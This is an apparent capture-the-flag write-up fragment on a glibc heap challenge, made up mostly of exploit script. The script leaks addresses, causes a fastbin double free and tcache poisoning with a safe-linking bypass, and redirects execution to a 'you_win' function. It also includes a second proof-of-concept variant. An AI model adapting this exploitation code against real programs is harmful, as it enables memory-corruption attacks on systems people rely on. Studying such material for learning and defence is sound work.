...
In this chall, I do the same way with guyintuxedo, but I want to navigate the `fastbin move to tcache` behaviour so here is some script to debug (it is worthy to do so):

## debug#1

Here i want to debug the bins before and after removal (to see its order and cnt).
...
view(0)
p_recvut(b"Contents: ")
rbp_secret = u64(p.recv(6).ljust(8, b"\x00")) + 0x30
print(hex(rbp_secret))

secret(0, 0x83)
view(0)
p_recvut(b"Contents: ")
code_base = u64(p.recv(6).ljust(8, b"\x00")) - e.symbols['secret']
print(hex(code_base))

# TESTING FASTBIN -> TCACHE BEHAVIOUR
for i in range(7): # fill out tcache
	free(i)
	remove(i)
...
for i in range(7): # clear out the tcache
	alloc(0x20, i)
...
'''
be4 malloc, bins in fastbin:
7 > 10 > 9 > 8 > 7 > 10 > .... 
(loop)
'''
alloc(0x20, 7)
'''
after malloc, bins in tcache:
10 > 7 > 8 > 9 > 10 
(5 bins in tcache, because of the cnt)
''' 

alloc(0x20, 10)
alloc(0x20, 9) # now 9 and 7 are same chunk
# if we can malloc more we can double malloc chunk 10

free(7)
remove(7)

target = (rbp_secret - 0x10) ^ (heap_base + 0x1810) >> 12
edit(9, p64(target))
alloc(0x20, 7)
alloc(0x20, 8)
win = code_base + e.symbols['you_win']
edit(8, p64(0) * 3 + p64(win))
...
Here is another POC, with the same technique `double free fastbin` in how2heap, we can `double - double malloc`. POC:
...
after malloc, bins in tcache:
8 > 7 > 8 
(3 bins in tcache, because of the cnt)
''' 
alloc(0x20, 8)

alloc(0x20, 9) # now 9 and 7 are same chunk
alloc(0x20, 10) # now 10 and 8 are the same chunk
